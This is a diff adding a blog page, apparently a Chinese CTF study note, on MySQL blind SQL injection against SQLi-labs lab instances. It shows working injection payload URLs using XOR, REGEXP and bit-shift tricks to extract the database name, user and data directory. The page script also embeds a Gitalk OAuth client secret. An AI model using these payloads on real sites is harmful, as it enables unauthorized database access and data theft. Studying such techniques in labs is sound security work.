@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+<title>
+    
+</title>
+<!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+<meta http-equiv="x-dns-prefetch-control" content="on">
+<link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
+<meta name="author" content="loecho">
+<meta name="description" content="安全行业的从业人员">
+<meta name="keywords" content="">
+<script async src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+<link rel="stylesheet" href="https://1oecho.github.io/styles/main.css" />
+<link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/css/style.min.css" />
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/tocbot.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/script.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/icon.min.js"></script>
+    
+            <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/js/Card/prism.min.js"></script>
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/css/Card/prism.min.css" />
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css">
+            <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js"></script>
+            
+                <!--点击特效-->
+                <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/love.min.js"></script>
+                
+                        <!--CDN样式-->
+                        <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/hit-kounter-lc-0.3.0.js"></script>
+                        <script src="https://cdn1.lncld.net/static/js/av-min-1.5.0.js"></script>
+                        
+                            <script>
+                                (function() {
+                                    var bp = document.createElement('script');
+                                    var curProtocol = window.location.protocol.split(':')[0];
+                                    if (curProtocol === 'https') {
+                                        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+                                    } else {
+                                        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                                    }
+                                    var s = document.getElementsByTagName("script")[0];
+                                    s.parentNode.insertBefore(bp, s);
+                                })();
+                            </script>
+                            
+</head>
+
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo">
+                <a href="https://1oecho.github.io">
+                    
+                </a>
+            </div>
+
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="https://1oecho.github.io/NoteBook">
+                        Index
+                    </a>
+                    
+                    <a class="menu-item" href="https://1oecho.github.io/tags">
+                        Tags
+                    </a>
+                    
+                    <a class="menu-item" href="https://github.com/loecho-sec">
+                        Whoami
+                    </a>
+                    
+                        <input id="switch_default" type="checkbox" class="switch_default">
+                        <label for="switch_default" class="toggleBtn"></label>
+            </div>
+            <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+            </form>
+        </div>
+    </nav>
+
+    
+        <nav class="navbar-mobile" id="nav-mobile">
+            <div class="container">
+                <div class="navbar-header">
+                    <div>
+                        <a href="https://1oecho.github.io">
+                            
+                        </a>
+                        <!--en-->
+                        <a id="mobile-toggle-theme-en" class="a en">&nbsp;Dark</a>
+                        <!--zh-->
+                        <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
+                    </div>
+                    <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
+                        <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+                    </form>
+                    <!--en-->
+                    <div class="menu-toggle" id="menu-toggle-en" onclick="mobileBtn()">&#9776; Menu</div>
+                    <!--zh-->
+                    <div class="menu-toggle" id="menu-toggle-zh" onclick="mobileBtn()">&#9776; &#x83DC;&#x5355;</div>
+
+                </div>
+                <div class="menu" id="mobile-menu">
+                    
+                        <a class="menu-item" href="https://1oecho.github.io/NoteBook">
+                            Index
+                        </a>
+                        
+                        <a class="menu-item" href="https://1oecho.github.io/tags">
+                            Tags
+                        </a>
+                        
+                        <a class="menu-item" href="https://github.com/loecho-sec">
+                            Whoami
+                        </a>
+                        
+                </div>
+            </div>
+        </nav>
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementById("menu-toggle-en");
+        var toggleMenu_zh = document.getElementById("menu-toggle-zh");
+
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.display != "none") {
+            if (toggleMenu.classList.contains("active")) {
+                toggleMenu.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        } else if (toggleMenu_zh.display != "none") {
+            if (toggleMenu_zh.classList.contains("active")) {
+                toggleMenu_zh.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu_zh.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        }
+
+    }
+</script>
+            <div class="main">
+                <div class="container">
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                知识技巧: MySQL盲注技巧记录
+                            </h1>
+                            
+                                    <!--zh-->
+                                    <div class="post-meta zh">
+                                        &#x4F5C;&#x8005;:
+                                        <a itemprop="author" rel="author" href="/">
+                                            
+                                        </a>
+                                        <span class="post-time">&#x65E5;&#x671F;: <a href="#">2020-03-17</a></span>
+                                        <span class="post-readtime">&#x9605;&#x8BFB;&#x65F6;&#x95F4;:<a
+                                    href="#">6.0
+                                    &#x5206;&#x949F;</a></span>
+                                        <span class="post-words">&#x5B57;&#x6570;:<a href="#">1467</a></span>
+                                        
+                                            <span class="post-category">&#x5206;&#x7C7B;:
+                                
+                                <a href="https://1oecho.github.io/Ty7qp_VIF/">CTF</a>
+                                
+                            </span>
+                                            
+                                                阅读量:
+                                                <span data-hk-page="current"> - </span>
+                                                
+                                    </div>
+                                    
+                        </header>
+                        
+                        <div class="post-content">
+                            <h2 id="0x01-目的">0x01 目的</h2>
+<p>总结一下,在CTF比赛中常用的SQL盲注技巧,一直更新,目的是为了锻炼自己在比赛中,快速编写过滤字符的SQL盲注脚本,实现各种骚技巧</p>
+<h2 id="0x02-分析">0x02 分析</h2>
+<h3 id="一-异或的使用">(一 )^ 异或的使用:</h3>
+<p>mysql中实验结果:</p>
+<pre><code class="language-sql">mysql&gt; select * from user where id = 1^0;    ===&gt; 做异或运算
++----+--------+----------+
+| id | name   | password |
++----+--------+----------+
+|  1 | loecho | 123456   |
++----+--------+----------+
+1 row in set (0.00 sec)
+
+mysql&gt; select * from user where id = 1^1; ====&gt; 做异或运算
+Empty set (0.00 sec)
+</code></pre>
+<h3 id="实际使用">实际使用:</h3>
+<p>1.其他截取方式,按照过滤规则和Fuzz结果变换<br>
+2.条件判断通过^来判断<br>
+3.编写脚本</p>
+<h4 id="实验">实验:</h4>
+<p><strong>构造Paylod:</strong></p>
+<h4 id="恒假条件">恒假条件</h4>
+<pre><code class="language-php">http://127.0.0.1:32769/Less-8/?id=1'^(length(database())&lt;0)^'--+
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://i.loli.net/2020/03/17/C6S5ewW8MtNGlRv.png" alt="" loading="lazy"></figure>
+<h4 id="恒真条件">恒真条件</h4>
+<pre><code class="language-php">http://127.0.0.1:32769/Less-8/?id=1'^(length(database())&gt;0)^'--+
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://i.loli.net/2020/03/17/5xw6X8KizysvNSr.png" alt="" loading="lazy"></figure>
+<p><strong>脚本编写:</strong><br>
+1.条件判断为,不存在标志为真,反之为假<br>
+2.Payload构造</p>
+<pre><code class="language-php">http://127.0.0.1:32769/Less-8/?id=1'^(ascii(substr(database(),1,1))='115')^'--
+</code></pre>
+<p><strong>脚本如下:</strong></p>
+<figure data-type="image" tabindex="3"><img src="https://i.loli.net/2020/03/17/iMc48tBYOaFzA3N.png" alt="" loading="lazy"></figure>
+<p><strong>运行结果:</strong></p>
+<figure data-type="image" tabindex="4"><img src="https://i.loli.net/2020/03/17/PNhAMX9wImKdycB.png" alt="" loading="lazy"></figure>
+<h3 id="二-正则regexp函数">(二) 正则Regexp函数:</h3>
+<p>mysql 中的正则有三种常用的方式 like 、rlike 和 regexp ，其中 Like 是精确匹配，而 rlike 和 regexp 是模糊匹配(只要正则能满足匹配字符串的子字符串就成立为真!)</p>
+<p>当然他们所使用的通配符略有差异：</p>
+<p><strong>(1)like 常用通配符：% 、_ 、escape</strong></p>
+<pre><code>% : 匹配0个或任意多个字符
+
+_ : 匹配任意一个字符
+
+escape ： 转义字符，可匹配%和_。如SELECT * FROM table_name WHERE column_name LIKE '/%/_%_' ESCAPE'/'
+</code></pre>
+<p><em><em>(2)rlike和regexp:常用通配符：. 、</em> 、 [] 、 ^ 、 $ 、{n}</em>*</p>
+<pre><code>. : 匹配任意单个字符
+* ： 匹配0个或多个前一个得到的字符
+
+[] : 匹配任意一个[]内的字符，[ab]*可匹配空串、a、b、或者由任意个a和b组成的字符串。
+
+^ : 匹配开头，如^s匹配以s或者S开头的字符串。
+
+$ : 匹配结尾，如s$匹配以s结尾的字符串。
+
+{n} : 匹配前一个字符反复n次。
+</code></pre>
+<h3 id="实验-2">实验:</h3>
+<p><strong>1.库名为: security</strong><br>
+<strong>2.Mid,substr 都可以截取</strong></p>
+<p><strong>为了显示清楚,就不那数据库演示了,使用SQL-lab的第二关,可以联合查询的关卡,演示</strong></p>
+<p><strong>构造Payload如下,2,3为显示位数:</strong></p>
+<p><strong>http://192.168.0.108:88/Less-2/?id=-1 union select 1,2,3--+</strong></p>
+<figure data-type="image" tabindex="5"><img src="https://i.loli.net/2020/03/18/CkvWP5FBlpYX1mD.png" alt="" loading="lazy"></figure>
+<p><strong>在显示为上操作,截取第一位字母,为s:</strong></p>
+<p><strong>http://192.168.0.108:88/Less-2/?id=-1 union select 1,mid(database(),1,1),3--+</strong><br>
+<img src="https://i.loli.net/2020/03/18/9hEe1LZkOKAznic.png" alt="" loading="lazy"></p>
+<p>配合正则来判断,现在是有显示情况,但是没有显示时,我们在只能利用盲注是来判断真假,</p>
+<p>在我们知道条件下,构造一个为真的条件,看返回(判断第一位是否为s),返回1说名为真!:</p>
+<p><strong>http://192.168.0.108:88/Less-2/?id=-1 union select 1,mid(database(),1,1) regexp '^s',3--+</strong></p>
+<figure data-type="image" tabindex="6"><img src="https://i.loli.net/2020/03/18/OSyq8h5inbVpLW1.png" alt="" loading="lazy"></figure>
+<p>构造个假的来看,返回为0:</p>
+<p><strong>http://192.168.0.108:88/Less-2/?id=-1 union select 1,mid(database(),1,1) regexp '^a',3--+</strong></p>
+<figure data-type="image" tabindex="7"><img src="https://i.loli.net/2020/03/18/KObRtSv7wszgDyB.png" alt="" loading="lazy"></figure>
+<p>通过上面实验我们就可以,来构造我们的脚本啦<br>
+但是在我测试过程中,还发现一个点,正则判断是时大小写是不敏感的,什么意思那,就是现在已知我们的库名为<strong>security</strong>,第一位为小写<strong>s</strong>,正则设置为 <code>^'S'</code> ,大写S,还是会返回真</p>
+<figure data-type="image" tabindex="8"><img src="https://i.loli.net/2020/03/18/3OhnlHgoBr2cMby.png" alt="" loading="lazy"></figure>
+<p>想了个解决办法就是加Ascii函数,转为ascii码值在比较,因为ascii码对应字母大小写</p>
+<p>我们为了提交注入效率,要利用到二分的想法.</p>
+<p><strong>1.把数据按位截取,确定范围,可以通过正则来大致判断(看是否为0-9,a-z)</strong><br>
+<strong>2.确定了大范围后,就可以从小范围中,利用二分法来读取数据</strong><br>
+<strong>3.实际情况,变换截取方式,总的方法还是不变</strong></p>
+<p>提取数据方式:</p>
+<pre><code class="language-python">
+and 1=(mid(database(),{},1) regexp '^{}')--+
+
+</code></pre>
+<p>脚本实现:</p>
+<figure data-type="image" tabindex="9"><img src="https://i.loli.net/2020/03/18/6hHjambzYGguFkI.png" alt="" loading="lazy"></figure>
+<p>考虑大小写问题,为了看效果,我们查看一下数据库路径(里面包含大小写特殊符号),最终Payload:</p>
+<pre><code>and 1=(ascii((mid(@@datadir,{},1)) regexp '^{}')--+
+
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://i.loli.net/2020/03/18/w8OE9bg5YRGn4eL.png" alt="" loading="lazy"></figure>
+<h3 id="三-利用移位符号">(三) 利用移位符号  &gt;&gt;</h3>
+<p>效率相对于其他盲注来说,是最高的.基本原理,以为字母可以转换为八位的二进制说,在SQL注入中,我们诸位截取字符串,转为二进制数在进行诸位判断,每个字符串最多查询八次就会得到数据,分析如下:</p>
+<p>比如查询一个 库名 :  <code>LoEcH0</code> 的数据库名,普通盲注,我们获取到库名长度后,按照每位查询.</p>
+<p>先贴上Ascii码表,可显字符(标记十进制:):</p>
+<figure data-type="image" tabindex="11"><img src="https://i.loli.net/2020/03/19/786pYm2fXODIySM.png" alt="" loading="lazy"></figure>
+<p><code>L</code> :   ascii码值(十进制):   <strong>76</strong>         次数:  32~76    =   <strong>44</strong><br>
+<code>o</code> :   ascii码值(十进制):  <strong>111</strong>        次数: 32~111   = <strong>79</strong><br>
+<code>E</code> :   ascii码值(十进制):   <strong>69</strong>         次数:  32~69    =   <strong>37</strong><br>
+<code>c</code> :   ascii码值(十进制):   <strong>99</strong>         次数:   32~99    =  <strong>67</strong><br>
+<code>H</code> :  ascii码值(十进制):   <strong>72</strong>          次数:   32~72    =  <strong>40</strong><br>
+<code>0</code>  :  ascii码值(十进制):   <strong>48</strong>          次数:   32~99     = <strong>67</strong></p>
+<p>而对应通过二进制查询,每位最多查8次就找到字符,<code>DB_Length x  8= 8*Length</code> 次,这是最多查询次数,实际次数是要小于这个次数的.</p>
+<p>通过这个想法来构造Payload</p>
+<p>已知: <strong>user() = root@localhost</strong></p>
+<figure data-type="image" tabindex="12"><img src="https://i.loli.net/2020/03/19/naQxNXBKW59Splo.png" alt="" loading="lazy"></figure>
+<p>第一位 <code>r</code> 二进制: 01110010 ,Payload是截取第一位字母转为二进制右移 <code>7</code>位,后面 = 0 为真,结果如下:</p>
+<p><strong>为真条件:(1=1 为真 )</strong></p>
+<pre><code>http://localhost:88/Less-2/?id=-1 union select 1,(ascii(mid(user(),1,1)) &gt;&gt; 7 )=0,user()--+
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://i.loli.net/2020/03/19/wVRxHSkrLy3BjDv.png" alt="" loading="lazy"></figure>
+<p><strong>为假条件(1 = 0 为假)</strong></p>
+<pre><code>http://localhost:88/Less-2/?id=-1 union select 1,(ascii(mid(user(),1,1)) &gt;&gt; 7 )=0,user()--+
+</code></pre>
+<figure data-type="image" tabindex="14"><img src="https://i.loli.net/2020/03/19/LjOriKegzGd2JAY.png" alt="" loading="lazy"></figure>
+<p><strong>盲注标记测试:</strong></p>
+<p><strong>条件为真,返回标记(You are in.......):</strong></p>
+<pre><code>http://localhost:88/Less-8/?id=1' and (ascii(mid(user(),1,1)) &gt;&gt; 7 )=0--+
+</code></pre>
+<figure data-type="image" tabindex="15"><img src="https://i.loli.net/2020/03/19/tQj6O7KUDHrZPxy.png" alt="" loading="lazy"></figure>
+<p><strong>条件为假,不返回标记:</strong></p>
+<pre><code>http://localhost:88/Less-8/?id=1' and (ascii(mid(user(),1,1)) &gt;&gt; 7 )=1--+
+</code></pre>
+<figure data-type="image" tabindex="16"><img src="https://i.loli.net/2020/03/19/BmQYvpleKOIS48H.png" alt="" loading="lazy"></figure>
+<h4 id="通过得到结果构造payload写脚本直接看大佬博客吧有现成的">通过得到结果,构造Payload,写脚本,直接看大佬博客吧,有现成的!:</h4>
+<p><strong>链接在这:</strong><br>
+https://phpinfo.me/2015/08/30/1026.html</p>
+<h2 id="继续更新">继续更新....</h2>
+
+                        </div>
+                        
+                                
+                                                    
+                                                                    <!--Share-->
+                                                                    <span style="margin-right:15px">
+                        <i class="post-share"></i>
+                        <span>&#x5206;&#x4EAB;:</span>
+                                                                    <a title="QR 码" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://1oecho.github.io/-mzuWFTQb/"><i class="fa fa-qrcode"></i></a>
+                                                                    <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://1oecho.github.io/-mzuWFTQb/&sharesource=qzone&title=知识技巧: MySQL盲注技巧记录&pics=https://1oecho.github.io/images/avatar.png?v=1702539383157&summary="><i class="fa fa-qq"></i></a>
+                                                                    <a title="新浪微博" target="_blank" href="https://service.weibo.com/share/share.php?url=https://1oecho.github.io/-mzuWFTQb/&sharesource=weibo&title=知识技巧: MySQL盲注技巧记录 + " - " + &pic="https://1oecho.github.io/images/avatar.png?v=1702539383157 "><i class="fa fa-weibo "></i></a>
+
+                                                                    </span>
+                                                                    
+                                                                            <!--zh-->
+                                                                            <section class="post-tags zh ">
+                                                                                <div>
+                                                                                    <span>&#x6807;&#x7B7E;:</span>
+                                                                                    <span class="tag ">
+                        
+                        
+                        <a href="https://1oecho.github.io/Ty7qp_VIF/">#
+                    CTF
+                        </a>
+                        
+                            
+                                </span>
+                                                                                </div>
+                                                                                <div>
+                                                                                    <a href="javascript:window.history.back();">
+                        &#x8FD4;&#x56DE;</a>
+                                                                                    <span>&dot;</span>
+                                                                                    <a href="#">&#x4E3B;&#x9875;</a>
+                                                                                </div>
+                                                                            </section>
+
+                                                                            
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                        <a class="prev" rel="prev" href="https://1oecho.github.io/CX976pZ6d/">
+                                                                                            小工具: CobaltStrike Becon上线 微信实时推送!
+                                                                                        </a>
+                                                                                        
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://1oecho.github.io/9Ua5xZkbb/">
+                                                                                                    内网渗透流程化学习记录
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
+                </div>
+                
+                    
+                        <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container" style="width: 100%;max-width: 780px;margin: auto;"></div>
+
+<script>
+    var gitalk = new Gitalk({
+        clientID: '61442cf87c4266a18189',
+        clientSecret: '7a1fd1e53e9179e32c4600883cd0612d09e0f292',
+        repo: 'loecho',
+        owner: '1oecho',
+        admin: ['1oecho'],
+        id: (location.pathname).substring(0, 49), // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+
+    gitalk.render('gitalk-container')
+</script>
+                            
+                                        
+                                            
+            </div>
+    </div>
+    </div>
+    </div>
+    
+        <footer id="footer" class="footer">
+            <div class="copyright">
+                
+                        loecho-sec
+                            
+                                <b id="hitokoto"></b><br>
+                                
+                                        <svg viewBox="0 0 1024 1024" style="margin-left: 5px;margin-right: 5px;" version="1.0" width="8" height="8" class="my-face">
+            <path
+                d="M863.597631 513.574282l-271.33965-140.213484L729.783667 81.926656c3.583731-7.87141 7.167462-15.742819 7.167462-25.214109C736.887134 25.226908 708.345275 0.012799 672.635953 0.012799a63.611229 63.611229 0 0 0-39.293053 12.607055c-1.791866 1.59988-3.519736 3.19976-5.311602 3.19976L147.87531 418.925381a55.547834 55.547834 0 0 0-19.646527 47.356448c1.791866 17.278704 14.27093 33.021523 32.125591 42.492813l271.33965 141.749369L292.504463 945.221908c-12.479064 25.214109-1.791866 53.563983 23.166262 69.306802 10.751194 6.335525 23.230258 9.47129 35.709322 9.47129 16.062795 0 32.125591-4.735645 44.604655-15.742819l480.091993-403.297753a55.547834 55.547834 0 0 0 19.646526-47.228458 61.243407 61.243407 0 0 0-32.12559-44.156688z"
+                fill="#93b5cf"></path>
+        </svg>
+                                         &copy;Copyright
+                                            <script>
+                                                var date = new Date();
+                                                document.write("" + date.getFullYear());
+                                            </script>
+                                            | Powered by
+                                            <a href="https://1oecho.github.io/" target="_blank">
+                                                loecho-sec
+                                            </a>
+            </div>
+            <div id="update" style="display:none;">
+                on
+            </div>
+            
+                <div id="version" style="display:none;">
+                    1.7.5
+                </div>
+                
+                    <script>
+                        var pat = '';
+                        
+                        document.write('<div id="home_path" style="display:none;">' + document.location.protocol + '//' + window.document.location.hostname + pat + '</div>')
+                    </script>
+        </footer>
+        
+            <script src='https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js'></script>
+            
+                <script>
+                    
+                    
+                    loadlive2d();
+                    
+                    
+                    hitokoto();
+                    
+                    getStar();
+                    hljs.initHighlighting();
+                    console.clear();
+                    
+                    CheckVersion();
+                    
+                    var newDate = new Date();
+                    newDate.setTime(1702539383157);
+                    console.log(" Blog Update Time: " + newDate.toLocaleDateString());
+                    console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
+                </script>
+                
+        </div>
+</body>
+<script>
+    scroll();
+</script>
+
+</html>
